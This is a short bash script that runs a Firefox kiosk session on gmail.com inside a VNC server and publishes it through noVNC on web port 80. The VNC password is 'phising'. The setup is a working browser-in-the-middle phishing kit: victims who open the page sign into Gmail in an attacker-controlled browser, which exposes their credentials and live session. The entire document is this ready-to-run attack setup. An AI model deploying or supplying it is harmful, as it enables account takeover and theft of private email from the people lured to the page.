#!/bin/bash

rm -rf ~/.vnc/*.pid ~/.vnc/*.log /tmp/.X1*
mkdir -p /root/.vnc/
touch /root/.Xauthority
echo "#!/bin/sh
unset SESSION_MANAGER
firefox --kiosk https://gmail.com/ &
exec openbox-session" > /root/.vnc/xstartup
chmod 755 /root/.vnc/xstartup
vncpasswd -f <<< phising > /root/.vnc/passwd
vncserver -PasswordFile /root/.vnc/passwd
/usr/share/novnc/utils/launch.sh --listen 80 --vnc 127.0.0.1:5901